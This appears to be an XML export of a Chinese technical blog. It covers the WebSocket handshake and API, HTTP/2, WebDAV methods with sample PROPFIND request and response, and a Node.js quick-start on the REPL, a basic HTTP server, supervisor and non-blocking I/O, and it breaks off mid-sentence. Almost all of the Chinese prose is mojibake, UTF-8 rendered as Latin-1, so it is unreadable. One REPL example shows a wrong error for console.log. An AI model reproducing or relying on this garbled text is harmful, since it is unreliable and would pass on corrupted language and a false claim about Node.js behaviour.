s3pPLMBiTxaQ9kYGzzhZRbK+xOo=Sec-WebSocket-Protocol: chat Sec-WebSocket-Accept çš„å­—æ®µå€¼æ˜¯ç”±æ¡æ‰‹è¯·æ±‚ä¸­çš„ Sec-WebSocket-Key çš„å­—æ®µå€¼ç”Ÿæˆçš„ã€‚ æˆåŠŸæ¡æ‰‹ç¡®ç«‹ WebSocket è¿žæŽ¥ä¹‹åŽï¼Œé€šä¿¡æ—¶ä¸å†ä½¿ç”¨ HTTP çš„æ•°æ®å¸§ï¼Œè€Œé‡‡ç”¨ WebSocket ç‹¬ç«‹çš„æ•°æ®å¸§ã€‚ WebSocket API JavaScript å¯è°ƒç”¨â€œThe WebSocketAPIâ€ï¼ˆhttp://www.w3.org/TR/websockets/ï¼Œç”± W3C æ ‡å‡†åˆ¶å®šï¼‰å†…æä¾›çš„ WebSocket ç¨‹åºæŽ¥å£ï¼Œä»¥å®žçŽ° WebSocket åè®®ä¸‹å…¨åŒå·¥é€šä¿¡ã€‚ä»¥ä¸‹ä¸ºè°ƒç”¨ WebSocket APIï¼Œæ¯ 50ms å‘é€ä¸€æ¬¡æ•°æ®çš„å®žä¾‹ã€‚ 1234567var socket = new WebSocket('ws://game.example.com:12010/updates');socket.onopen = function () &#123; setInterval(function() &#123; if (socket.bufferedAmount == 0) socket.send(getUpdateData()); &#125;, 50);&#125;; æœŸç›¼å·²ä¹…çš„ HTTP/2.0HTTP/2 ï¼ˆåŽŸåHTTP/2.0ï¼‰å³è¶…æ–‡æœ¬ä¼ è¾“åè®® 2.0ï¼Œæ˜¯ä¸‹ä¸€ä»£HTTPåè®®ã€‚æ˜¯ç”±äº’è”ç½‘å·¥ç¨‹ä»»åŠ¡ç»„ï¼ˆIETFï¼‰çš„Hypertext Transfer Protocol Bis (httpbis)å·¥ä½œå°ç»„è¿›è¡Œå¼€å‘ã€‚æ˜¯è‡ª1999å¹´http1.1å‘å¸ƒåŽçš„é¦–ä¸ªæ›´æ–°ã€‚HTTP 2.0åœ¨2013å¹´8æœˆè¿›è¡Œé¦–æ¬¡åˆä½œå…±äº‹æ€§æµ‹è¯•ã€‚åœ¨å¼€æ”¾äº’è”ç½‘ä¸ŠHTTP 2.0å°†åªç”¨äºŽhttps://ç½‘å€ï¼Œè€Œ http://ç½‘å€å°†ç»§ç»­ä½¿ç”¨HTTP/1ï¼Œç›®çš„æ˜¯åœ¨å¼€æ”¾äº’è”ç½‘ä¸Šå¢žåŠ ä½¿ç”¨åŠ å¯†æŠ€æœ¯ï¼Œä»¥æä¾›å¼ºæœ‰åŠ›çš„ä¿æŠ¤åŽ»éåˆ¶ä¸»åŠ¨æ”»å‡»ã€‚DANE RFC6698å…è®¸åŸŸåç®¡ç†å‘˜ä¸é€šè¿‡ç¬¬ä¸‰æ–¹CAè‡ªè¡Œå‘è¡Œè¯ä¹¦ã€‚ï¼ˆæ‘˜è‡ªç™¾åº¦ç™¾ç§‘ï¼‰ HTTP/2.0è‹±æ–‡æ–‡æ¡£ Web æœåŠ¡å™¨ç®¡ç†æ–‡ä»¶çš„ WebDAVWebDAVï¼ˆWeb-based Distributed Authoring and Versioningï¼ŒåŸºäºŽä¸‡ç»´ç½‘çš„åˆ†å¸ƒå¼åˆ›ä½œå’Œç‰ˆæœ¬æŽ§åˆ¶ï¼‰æ˜¯ä¸€ä¸ªå¯å¯¹ Web æœåŠ¡å™¨ä¸Šçš„å†…å®¹ç›´æŽ¥è¿›è¡Œæ–‡ä»¶å¤åˆ¶ã€ç¼–è¾‘ç­‰æ“ä½œçš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿã€‚å®ƒä½œä¸ºæ‰©å±• HTTP/1.1çš„åè®®å®šä¹‰åœ¨ RFC4918ã€‚é™¤äº†åˆ›å»ºã€åˆ é™¤æ–‡ä»¶ç­‰åŸºæœ¬åŠŸèƒ½ï¼Œå®ƒè¿˜å…·å¤‡æ–‡ä»¶åˆ›å»ºè€…ç®¡ç†ã€æ–‡ä»¶ç¼–è¾‘è¿‡ç¨‹ä¸­ç¦æ­¢å…¶ä»–ç”¨æˆ·å†…å®¹è¦†ç›–çš„åŠ é”åŠŸèƒ½ï¼Œä»¥åŠå¯¹æ–‡ä»¶å†…å®¹ä¿®æ”¹çš„ç‰ˆæœ¬æŽ§åˆ¶åŠŸèƒ½ã€‚ ä½¿ç”¨ HTTP/1.1 çš„ PUT æ–¹æ³•å’Œ DELETE æ–¹æ³•ï¼Œå°±å¯ä»¥å¯¹ Web æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶è¿›è¡Œåˆ›å»ºå’Œåˆ é™¤æ“ä½œã€‚å¯æ˜¯å‡ºäºŽå®‰å…¨æ€§åŠä¾¿æ·æ€§ç­‰è€ƒè™‘ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨ã€‚ æ‰©å±• HTTP/1.1 çš„ WebDAVé’ˆå¯¹æœåŠ¡å™¨ä¸Šçš„èµ„æºï¼ŒWebDAV æ–°å¢žåŠ äº†ä¸€äº›æ¦‚å¿µï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ é›†åˆï¼ˆCollectionï¼‰ï¼šæ˜¯ä¸€ç§ç»Ÿä¸€ç®¡ç†å¤šä¸ªèµ„æºçš„æ¦‚å¿µã€‚ä»¥é›†åˆä¸ºå•ä½å¯è¿›è¡Œå„ç§æ“ä½œã€‚ä¹Ÿå¯å®žçŽ°ç±»ä¼¼é›†åˆçš„é›†åˆè¿™æ ·çš„å åŠ ã€‚ èµ„æºï¼ˆResourceï¼‰ï¼šæŠŠæ–‡ä»¶æˆ–é›†åˆç§°ä¸ºèµ„æºã€‚ å±žæ€§ï¼ˆPropertyï¼‰ï¼šå®šä¹‰èµ„æºçš„å±žæ€§ã€‚å®šä¹‰ä»¥â€œåç§° = å€¼â€çš„æ ¼å¼æ‰§è¡Œã€‚ é”ï¼ˆLockï¼‰ï¼šæŠŠæ–‡ä»¶è®¾ç½®æˆæ— æ³•ç¼–è¾‘çŠ¶æ€ã€‚å¤šäººåŒæ—¶ç¼–è¾‘æ—¶ï¼Œå¯é˜²æ­¢åœ¨åŒä¸€æ—¶é—´è¿›è¡Œå†…å®¹å†™å…¥ã€‚ WebDAV å†…æ–°å¢žçš„æ–¹æ³•åŠçŠ¶æ€ç WebDAV ä¸ºå®žçŽ°è¿œç¨‹æ–‡ä»¶ç®¡ç†ï¼Œå‘ HTTP/1.1 ä¸­è¿½åŠ äº†ä»¥ä¸‹è¿™äº›æ–¹æ³•ã€‚ PROPFIND ï¼šèŽ·å–å±žæ€§PROPPATCH ï¼šä¿®æ”¹å±žæ€§MKCOL ï¼šåˆ›å»ºé›†åˆCOPY ï¼šå¤åˆ¶èµ„æºåŠå±žæ€§MOVE ï¼šç§»åŠ¨èµ„æºLOCK ï¼šèµ„æºåŠ é”UNLOCK ï¼šèµ„æºè§£é”ä¸ºé…åˆæ‰©å±•çš„æ–¹æ³•ï¼ŒçŠ¶æ€ç ä¹Ÿéšä¹‹æ‰©å±•ã€‚102 Processing ï¼šå¯æ­£å¸¸å¤„ç†è¯·æ±‚ï¼Œä½†ç›®å‰æ˜¯å¤„ç†ä¸­çŠ¶æ€207 Multi-Status ï¼šå­˜åœ¨å¤šç§çŠ¶æ€422 Unprocessible Entity ï¼šæ ¼å¼æ­£ç¡®ï¼Œå†…å®¹æœ‰è¯¯423 Locked ï¼šèµ„æºå·²è¢«åŠ é”424 Failed Dependency ï¼šå¤„ç†ä¸ŽæŸè¯·æ±‚å…³è”çš„è¯·æ±‚å¤±è´¥ï¼Œå› æ­¤ä¸å†ç»´æŒä¾èµ–å…³ç³» 507 Insufficient Storage ï¼šä¿å­˜ç©ºé—´ä¸è¶³ WebDAV çš„è¯·æ±‚å®žä¾‹ä¸‹é¢æ˜¯ä½¿ç”¨ PROPFIND æ–¹æ³•å¯¹ http://www.example.com/file å‘èµ·èŽ·å–å±žæ€§çš„è¯·æ±‚ã€‚ 12345678910111213PROPFIND /file HTTP/1.1Host: www.example.comContent-Type: application/xml; charset="utf-8"Content-Length: 219&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;D:propfind xmlns:D="DAV:"&gt; &lt;D:prop xmlns:R="http://ns.example.com/boxschema/"&gt; &lt;R:bigbox/&gt; &lt;R:author/&gt; &lt;R:DingALing/&gt; &lt;R:Random/&gt; &lt;/D:prop&gt;&lt;/D:propfind&gt; WebDAV çš„å“åº”å®žä¾‹ ä¸‹é¢æ˜¯é’ˆå¯¹ä¹‹å‰çš„ PROPFIND æ–¹æ³•ï¼Œè¿”å›žhttp://www.example.com/file çš„å±žæ€§çš„å“åº”ã€‚ 12345678910111213141516171819202122232425262728HTTP/1.1 207 Multi-StatusContent-Type: application/xml; charset="utf-8"Content-Length: 831&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;D:multistatus xmlns:D="DAV:"&gt; &lt;D:response xmlns:R="http://ns.example.com/boxschema/"&gt; &lt;D:href&gt;http://www.example.com/file&lt;/D:href&gt; &lt;D:propstat&gt; &lt;D:prop&gt; &lt;R:bigbox&gt; &lt;R:BoxType&gt;Box type A&lt;/R:BoxType&gt; &lt;/R:bigbox&gt; &lt;R:author&gt; &lt;R:Name&gt;J.J. Johnson&lt;/R:Name&gt; &lt;/R:author&gt; &lt;/D:prop&gt; &lt;D:status&gt;HTTP/1.1 200 OK&lt;/D:status&gt; &lt;/D:propstat&gt; &lt;D:propstat&gt; &lt;D:prop&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt; &lt;D:status&gt;HTTP/1.1 403 Forbidden&lt;/D:status&gt; &lt;D:responsedescription&gt; The user does not have access to the DingALing property. &lt;/D:responsedescription&gt; &lt;/D:propstat&gt; &lt;/D:response&gt; &lt;D:responsedescription&gt; There has been an access violation error. &lt;/D:responsedescription&gt;&lt;/D:multistatus&gt; å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¥½çŽ©çš„Nodejs â€”â€” Node.jså¿«é€Ÿå…¥é—¨]]></title>
    <url>%2F2018-09-13-NodeJs-Part3.html</url>
    <content type="text"><![CDATA[ä¸»è¦å†…å®¹ï¼š ç¼–å†™ç¬¬ä¸€ä¸ª Node.js ç¨‹åº å¼‚æ­¥å¼ I/O å’Œäº‹ä»¶å¾ªçŽ¯ æ¨¡å—å’ŒåŒ… è°ƒè¯• Node.js å¿«é€Ÿå…¥é—¨Node.js å…·æœ‰æ·±åŽšçš„å¼€æºè¡€ç»Ÿï¼Œå®ƒè¯žç”ŸäºŽæ‰˜ç®¡äº†è®¸å¤šä¼˜ç§€å¼€æºé¡¹ç›®çš„ç½‘ç«™â€”â€” githubã€‚ å¼€å§‹ä½¿ç”¨ Node.js ç¼–ç¨‹Hello Worldæ‰“å¼€å¸¸ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¾“å…¥ 1console.log('Hello World'); æ–‡ä»¶ä¿å­˜ä¸º helloworld.js ï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œè¿›å…¥æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 1node helloworld.js å°±å¯ä»¥åœ¨ç»ˆç«¯çœ‹åˆ°è¾“å‡º Hello World console æ˜¯ Node.js æä¾›çš„æŽ§åˆ¶å°å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«äº†å‘æ ‡å‡†è¾“å‡ºå†™å…¥çš„æ“ä½œï¼Œå¦‚ console.log ã€console.error Node.js å‘½ä»¤è¡Œå·¥å…·ç»ˆç«¯è¾“å…¥ node â€“help å¯ä»¥çœ‹åˆ°è¯¦ç»†çš„å¸®åŠ©ä¿¡æ¯ã€‚ C:\Users\Administrator\Desktop&gt;node â€“helpUsage: node [options][ -e script | script.js | - ] [arguments] node inspect script.js [arguments] Options: -v, â€“version print Node.js version -e, â€“eval script evaluate script -p, â€“print evaluate script and print result -c, â€“check syntax check script without executing -i, â€“interactive always enter the REPL even if stdin does not appear to be a terminal -r, â€“require module to preload (option can be repeated) script read from stdin (default; interactive mode if a tty)â€“inspect[=[host:]port] activate inspector on host:port(default: 127.0.0.1:9229)â€“inspect-brk[=[host:]port]activate inspector on host:portand break at start of user scriptâ€“inspect-port=[host:]portset host:port for inspectorâ€“no-deprecation silence deprecation warningsâ€“trace-deprecation show stack traces on deprecationsâ€“throw-deprecation throw an exception on deprecationsâ€“pending-deprecation emit pending deprecation warningsâ€“no-warnings silence all process warningsâ€“napi-modules load N-API modules (no-op - optionkept for compatibility)â€“abort-on-uncaught-exceptionaborting instead of exiting causes acore file to be generated for analysisâ€“trace-warnings show stack traces on process warningsâ€“redirect-warnings=filewrite warnings to file instead ofstderrâ€“trace-sync-io show stack trace when use of sync IOis detected after the first tickâ€“force-async-hooks-checksenables checks for async_hooksâ€“trace-events-enabled track trace eventsâ€“trace-event-categories comma separated list of trace eventcategories to recordâ€“track-heap-objects track heap object allocations for heap snapshotsâ€“prof-process process v8 profiler output generatedusing â€“profâ€“zero-fill-buffers automatically zero-fill all newly allocatedBuffer and SlowBuffer instancesâ€“v8-options print v8 command line optionsâ€“v8-pool-size=num set v8â€™s thread pool sizeâ€“tls-cipher-list=val use an alternative default TLS cipher listâ€“use-bundled-ca use bundled CA store (default)â€“use-openssl-ca use OpenSSLâ€™s default CA storeâ€“openssl-config=file load OpenSSL configuration from thespecified file (overridesOPENSSL_CONF)â€“icu-data-dir=dir set ICU data load path to dir(overrides NODE_ICU_DATA)â€“preserve-symlinks preserve symbolic links when resolvingâ€“experimental-modules experimental ES Module supportand caching modules Environment variables:NODE_DEBUG â€˜,â€™-separated list of core modules that should print debug informationNODE_DISABLE_COLORS set to 1 to disable colors in the REPLNODE_EXTRA_CA_CERTS path to additional CA certificates fileNODE_ICU_DATA data path for ICU (Intl object) dataNODE_NO_WARNINGS set to 1 to silence process warningsNODE_NO_HTTP2 set to 1 to suppress the http2 moduleNODE_OPTIONS set CLI options in the environment via a space-separated listNODE_PATH â€˜;â€™-separated list of directories prefixed to the module search pathNODE_PENDING_DEPRECATION set to 1 to emit pending deprecation warningsNODE_REPL_HISTORY path to the persistent REPL history fileNODE_REDIRECT_WARNINGS write warnings to path instead of stderrOPENSSL_CONF load OpenSSL configuration from file Documentation can be found at https://nodejs.org/ å…¶ä¸­æ˜¾ç¤ºäº† node çš„ç”¨æ³•ï¼Œè¿è¡Œ Node.js ç¨‹åºçš„åŸºæœ¬æ–¹æ³•å°±æ˜¯æ‰§è¡Œ node script.js ï¼Œå…¶ä¸­ script.js æ˜¯è„šæœ¬çš„æ–‡ä»¶åã€‚ é™¤äº†ç›´æŽ¥è¿è¡Œè„šæœ¬æ–‡ä»¶å¤–ï¼Œ node â€“help æ˜¾ç¤ºçš„ä½¿ç”¨æ–¹æ³•ä¸­è¯´æ˜Žäº†å¦ä¸€ç§è¾“å‡º HelloWorld çš„æ–¹å¼ï¼š 12$ node -e "console.log('Hello World');"Hello World æˆ‘ä»¬å¯ä»¥æŠŠè¦æ‰§è¡Œçš„è¯­å¥ä½œä¸º node -e çš„å‚æ•°ç›´æŽ¥æ‰§è¡Œã€‚ ä½¿ç”¨ node çš„ REPL æ¨¡å¼REPL ï¼ˆRead-eval-print loopï¼‰ï¼Œå³è¾“å…¥â€”æ±‚å€¼â€”è¾“å‡ºå¾ªçŽ¯,è¿è¡Œæ— å‚æ•°çš„ node å°†ä¼šå¯åŠ¨ä¸€ä¸ª JavaScriptçš„äº¤äº’å¼ shellï¼š 123$ node&gt; console.log('1');ReferenceError: console is not defined è¿›å…¥ REPL æ¨¡å¼ä»¥åŽï¼Œä¼šå‡ºçŽ°ä¸€ä¸ªâ€œ &gt; â€æç¤ºç¬¦æç¤ºä½ è¾“å…¥å‘½ä»¤ï¼Œè¾“å…¥åŽæŒ‰å›žè½¦ï¼ŒNode.jså°†ä¼šè§£æžå¹¶æ‰§è¡Œå‘½ä»¤ã€‚å¦‚æžœä½ æ‰§è¡Œäº†ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆ REPL è¿˜ä¼šåœ¨ä¸‹é¢æ˜¾ç¤ºè¿™ä¸ªå‡½æ•°çš„è¿”å›žå€¼. å¦‚æžœä½ è¾“å…¥äº†ä¸€ä¸ªé”™è¯¯çš„æŒ‡ä»¤ï¼ŒREPL åˆ™ä¼šç«‹å³æ˜¾ç¤ºé”™è¯¯å¹¶è¾“å‡ºè°ƒç”¨æ ˆã€‚åœ¨ä»»ä½•æ—¶å€™ï¼Œè¿žç»­æŒ‰ä¸¤æ¬¡ Ctrl + C å³å¯æŽ¨å‡ºNode.js çš„ REPL æ¨¡å¼ã€‚ å»ºç«‹ HTTP æœåŠ¡å™¨Node.js æ˜¯ä¸ºç½‘ç»œè€Œè¯žç”Ÿçš„å¹³å°ï¼Œä½†åˆä¸Ž ASPã€PHP æœ‰å¾ˆå¤§çš„ä¸åŒï¼Œç©¶ç«Ÿä¸åŒåœ¨å“ªé‡Œå‘¢ï¼Ÿ PHP æž¶æž„æ˜¯ä¸€ç§â€œæµè§ˆå™¨ - HTTP æœåŠ¡å™¨ - PHP è§£é‡Šå™¨â€çš„ç»„ç»‡æ–¹å¼ã€‚è€Œ Node.js åˆ™æ˜¯ â€œæµè§ˆå™¨ - Nodeâ€ åˆ›å»ºä¸€ä¸ªHTTP æœåŠ¡å™¨ï¼Œå»ºç«‹ä¸€ä¸ªåä¸º app.js çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 12345678var http = require('http');http.createServer(function(req, res)&#123; res.writeHead(200, &#123;'Content-Type': 'text/html'&#125;); res.write('&lt;h1&gt;Node.js&lt;/h1&gt;'); res.end('&lt;p&gt;Hello World&lt;/p&gt;');&#125;).listen(3000);console.log("HTTP server is listening at port 3000."); æŽ¥ä¸‹æ¥è¿è¡Œ node app.js å‘½ä»¤ï¼Œæ‰“å¼€æµè§ˆå™¨è®¿é—® http://127.0.0.1:3000 å°±å¯ä»¥çœ‹åˆ°ä»¥ä¸‹å†…å®¹ ç”¨ Node.js å®žçŽ°çš„æœ€ç®€å•çš„ HTTP æœåŠ¡å™¨å°±è¿™æ ·è¯žç”Ÿäº†ã€‚è¿™ä¸ªç¨‹åºè°ƒç”¨äº† Node.js æä¾›çš„http æ¨¡å—ï¼Œå¯¹æ‰€æœ‰ HTTP è¯·æ±‚ç­”å¤åŒæ ·çš„å†…å®¹å¹¶ç›‘å¬ 3000 ç«¯å£ã€‚åœ¨ç»ˆç«¯ä¸­è¿è¡Œè¿™ä¸ªè„šæœ¬æ—¶ï¼Œæˆ‘ä»¬ä¼šå‘çŽ°å®ƒå¹¶ä¸åƒ Hello World ä¸€æ ·ç»“æŸåŽç«‹å³é€€å‡ºï¼Œè€Œæ˜¯ä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°æŒ‰ä¸‹ Ctrl +C æ‰ä¼šç»“æŸã€‚è¿™æ˜¯å› ä¸º listen å‡½æ•°ä¸­åˆ›å»ºäº†äº‹ä»¶ç›‘å¬å™¨ï¼Œä½¿å¾— Node.js è¿›ç¨‹ä¸ä¼šé€€å‡ºäº‹ä»¶å¾ªçŽ¯ã€‚ å°æŠ€å·§â€”â€”ä½¿ç”¨ supervisorupervisor ç›‘è§†ä½ å¯¹ä»£ç çš„æ”¹åŠ¨ï¼Œå¹¶è‡ªåŠ¨é‡å¯ Node.jsï¼Œä½†æ˜¯æµè§ˆå™¨è¿˜æ˜¯å¾—æ‰‹åŠ¨åˆ·æ–°ã€‚ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œé¦–å…ˆä½¿ç”¨ npm å®‰è£… supervisorï¼š 1234567891011$ supervisor app.js Running node-supervisor with program 'app.js' --watch '.' --extensions 'node,js' --exec 'node'Starting child process with 'node app.js'Watching directory 'C:\Users\Administrator\Desktop' for changes.Press rs for restarting the process.HTTP server is listening at port 3000. å½“ä»£ç å˜åŒ–çš„æ—¶å€™ï¼Œè¿è¡Œçš„è„šæœ¬ä¼šè¢«ç»ˆæ­¢ï¼Œç„¶åŽé‡æ–°å¯åŠ¨ï¼š 123crashing childStarting child process with 'node app.js'HTTP server is listening at port 3000. supervisor è¿™ä¸ªå°å·¥å…·å¯ä»¥è§£å†³å¼€å‘ä¸­çš„è°ƒè¯•é—®é¢˜ã€‚ å¼‚æ­¥å¼ I/O ä¸Žäº‹ä»¶å¼ç¼–ç¨‹Node.js æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å¼‚æ­¥å¼ I/Oï¼ˆæˆ–è€…éžé˜»å¡ž I/Oï¼‰ä¸Žäº‹ä»¶ç´§å¯†ç»“åˆçš„ç¼–ç¨‹æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ä¸Žä¼ ç»Ÿçš„åŒæ­¥å¼ I/O çº¿æ€§çš„ç¼–ç¨‹æ€è·¯æœ‰å¾ˆå¤§çš„ä¸åŒï¼Œå› ä¸ºæŽ§åˆ¶æµå¾ˆå¤§ç¨‹åº¦ä¸Šè¦é äº‹ä»¶å’Œå›žè°ƒå‡½æ•°æ¥ç»„ç»‡ï¼Œä¸€ä¸ªé€»è¾‘è¦æ‹†åˆ†ä¸ºè‹¥å¹²ä¸ªå•å…ƒã€‚ é˜»å¡žä¸Žçº¿ç¨‹ä»€ä¹ˆæ˜¯é˜»å¡žï¼ˆblockï¼‰å‘¢ï¼Ÿçº¿ç¨‹åœ¨æ‰§è¡Œä¸­å¦‚æžœé‡åˆ°ç£ç›˜è¯»å†™æˆ–ç½‘ç»œé€šä¿¡ï¼ˆç»Ÿç§°ä¸º I/O æ“ä½œï¼‰ï¼Œé€šå¸¸è¦è€—è´¹è¾ƒé•¿çš„æ—¶é—´ï¼Œè¿™æ—¶æ“ä½œç³»ç»Ÿä¼šå‰¥å¤ºè¿™ä¸ªçº¿ç¨‹çš„ CPU æŽ§åˆ¶æƒï¼Œä½¿å…¶æš‚åœæ‰§è¡Œï¼ŒåŒæ—¶å°†èµ„æºè®©ç»™å…¶ä»–çš„å·¥ä½œçº¿ç¨‹ï¼Œè¿™ç§çº¿ç¨‹è°ƒåº¦æ–¹å¼ç§°ä¸º é˜»å¡žã€‚å½“ I/O æ“ä½œå®Œæ¯•æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°†è¿™ä¸ªçº¿ç¨‹çš„é˜»å¡žçŠ¶æ€è§£é™¤ï¼Œæ¢å¤å…¶å¯¹CPUçš„æŽ§åˆ¶æƒï¼Œä»¤å…¶ç»§ç»­æ‰§è¡Œã€‚è¿™ç§ I/O æ¨¡å¼å°±æ˜¯é€šå¸¸çš„åŒæ­¥å¼ I/Oï¼ˆSynchronous I/Oï¼‰æˆ–é˜»å¡žå¼ I/O ï¼ˆBlocking I/Oï¼‰ã€‚ ç›¸åº”åœ°ï¼Œå¼‚æ­¥å¼ I/O ï¼ˆAsynchronous I/Oï¼‰æˆ–éžé˜»å¡žå¼ I/O ï¼ˆNon-blocking I/Oï¼‰åˆ™é’ˆå¯¹æ‰€æœ‰ I/O æ“ä½œä¸é‡‡ç”¨é˜»å¡žçš„ç­–ç•¥ã€‚å½“çº¿ç¨‹é‡åˆ° I/O æ“ä½œæ—¶ï¼Œä¸ä¼šä»¥é˜»å¡žçš„æ–¹å¼ç­‰å¾… I/O æ“ä½œçš„å®Œæˆæˆ–æ•°æ®çš„è¿”å›žï¼Œè€Œåªæ˜¯å°† I/O è¯·æ±‚å‘é€ç»™æ“ä½œç³»ç»Ÿï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡è¯­å¥ã€‚å½“æ“ä½œç³»ç»Ÿå®Œæˆ I/O æ“ä½œæ—¶ï¼Œä»¥äº‹ä»¶çš„å½¢å¼é€šçŸ¥æ‰§è¡Œ I/O æ“ä½œçš„çº¿ç¨‹ï¼Œçº¿ç¨‹ä¼šåœ¨ç‰¹å®šæ—¶å€™å¤„ç†è¿™ä¸ªäº‹ä»¶ã€‚ä¸ºäº†å¤„ç†å¼‚æ­¥ I/Oï¼Œçº¿ç¨‹å¿…é¡»æœ‰äº‹ä»¶å¾ªçŽ¯ï¼Œä¸æ–­åœ°æ£€æŸ¥æœ‰æ²¡æœ‰æœªå¤„ç†çš„äº‹ä»¶ï¼Œä¾æ¬¡äºˆä»¥å¤„ç†ã€‚ é˜»å¡žæ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªçº¿ç¨‹åªèƒ½å¤„ç†ä¸€é¡¹ä»»åŠ¡ï¼Œè¦æƒ³æé«˜åžåé‡å¿…é¡»é€šè¿‡å¤šçº¿ç¨‹ã€‚è€Œéžé˜»å¡žæ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªçº¿ç¨‹æ°¸è¿œåœ¨æ‰§è¡Œè®¡ç®—æ“ä½œï¼Œè¿™ä¸ªçº¿ç¨‹æ‰€ä½¿ç”¨çš„ CPU æ ¸å¿ƒåˆ©ç”¨çŽ‡æ°¸è¿œæ˜¯ 100%ï¼ŒI/O ä»¥äº‹ä»¶çš„æ–¹å¼é€šçŸ¥ã€‚åœ¨é˜»å¡žæ¨¡å¼ä¸‹ï¼Œå¤šçº¿ç¨‹å¾€å¾€èƒ½æé«˜ç³»ç»Ÿåžåé‡ï¼Œå› ä¸ºä¸€ä¸ªçº¿ç¨‹é˜»å¡žæ—¶è¿˜æœ‰å…¶ä»–çº¿ç¨‹åœ¨å·¥ä½œï¼Œå¤šçº¿ç¨‹å¯ä»¥è®© CPU èµ„æºä¸è¢«é˜»å¡žä¸­çš„çº¿ç¨‹æµªè´¹ã€‚è€Œåœ¨éžé˜»å¡žæ¨¡å¼ä¸‹ï¼Œçº¿ç¨‹ä¸ä¼šè¢« I/O é˜»å¡žï¼Œæ°¸è¿œåœ¨åˆ©ç”¨ CPUã€‚å¤šçº¿ç¨‹å¸¦æ¥çš„å¥½å¤„ä»…ä»…æ˜¯åœ¨å¤šæ ¸ CPU çš„æƒ…å†µä¸‹åˆ©ç”¨æ›´å¤šçš„æ ¸ï¼Œè€ŒNode.jsçš„å•çº¿ç¨‹ä¹Ÿèƒ½å¸¦æ¥åŒæ ·çš„å¥½å¤„ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Node.js ä½¿ç”¨äº†å•çº¿ç¨‹ã€éžé˜»å¡žçš„äº‹ä»¶ç¼–ç¨‹æ¨¡å¼ã€‚ å‡è®¾æˆ‘ä»¬æœ‰ä¸€é¡¹å·¥ä½œï¼Œå¯ä»¥åˆ†ä¸ºä¸¤ä¸ªè®¡ç®—éƒ¨åˆ†å’Œä¸€ä¸ª I/O éƒ¨åˆ†ï¼ŒI/O éƒ¨åˆ†å çš„æ—¶é—´æ¯”è®¡ç®—å¤šå¾—å¤šï¼ˆé€šå¸¸éƒ½æ˜¯è¿™æ ·ï¼‰ã€‚å¦‚æžœæˆ‘ä»¬ä½¿ç”¨é˜»å¡ž I/Oï¼Œé‚£ä¹ˆè¦æƒ³èŽ·å¾—é«˜å¹¶å‘å°±å¿…é¡»å¼€å¯å¤šä¸ªçº¿ç¨‹ã€‚è€Œä½¿ç”¨å¼‚æ­¥å¼ I/Oæ—¶ï¼Œå•çº¿ç¨‹å³å¯èƒœä»»ã€‚ å•çº¿ç¨‹æ—¶é—´é©±åŠ¨çš„å¼‚æ­¥å¼ I/O æ¯”ä¼ ç»Ÿçš„å¤šçº¿ç¨‹é˜»å¡žå¼ I/O ç©¶ç«Ÿå¥½åœ¨å“ªé‡Œï¼Ÿ ç®€è€Œè¨€ä¹‹ã€‚å¼‚æ­¥å¼ I/O å°±æ˜¯å°‘äº†å¤šçº¿ç¨‹çš„å¼€é”€ï¼Œå¯¹æ“ä½œç³»ç»Ÿæ¥è¯´ï¼Œåˆ›å»ºä¸€ä¸ªçº¿ç¨‹çš„ä»£ä»·æ˜¯ååˆ†æ˜‚è´µçš„ï¼Œéœ€è¦ç»™å®ƒåˆ†é…å†…å­˜ï¼Œåˆ—å…¥è°ƒåº¦ï¼ŒåŒæ—¶åœ¨çº¿ç¨‹åˆ‡æ¢çš„æ—¶å€™è¿˜è¦æ‰§è¡Œå†…å­˜æ¢é¡µï¼ŒCPU çš„ç¼“å­˜è¢«æ¸…ç©ºï¼Œåˆ‡æ¢å›žæ¥çš„æ—¶å€™è¿˜è¦é‡æ–°ä»Žå†…å­˜ä¸­è¯»å–ä¿¡æ¯ï¼Œç ´åäº†æ•°æ®çš„å±€é™æ€§ï¼ˆåŸºäºŽå¤šçº¿ç¨‹çš„æ¨¡åž‹ä¹Ÿæœ‰ç›¸åº”çš„è§£å†³æ–¹æ¡ˆï¼Œå¦‚è½»é‡çº§çº¿ç¨‹ï¼ˆlightweight threadï¼‰ç­‰ã€‚äº‹ä»¶é©±åŠ¨çš„å•çº¿ç¨‹å¼‚æ­¥æ¨¡åž‹ä¸Žå¤šçº¿ç¨‹åŒæ­¥æ¨¡åž‹åˆ°åº•è°æ›´å¥½æ˜¯ä¸€ä»¶éžå¸¸æœ‰äº‰è®®çš„äº‹æƒ…ï¼Œå› ä¸ºå°½ç®¡æ¶ˆè€—èµ„æºï¼ŒåŽè€…çš„åžåçŽ‡å¹¶ä¸æ¯”å‰è€…ä½Žã€‚ï¼‰ã€‚ å½“ç„¶å¼‚æ­¥å¼ç¼–ç¨‹çš„ç¼ºç‚¹åœ¨äºŽä¸ç¬¦åˆäººä»¬ä¸€æŠŠä½ 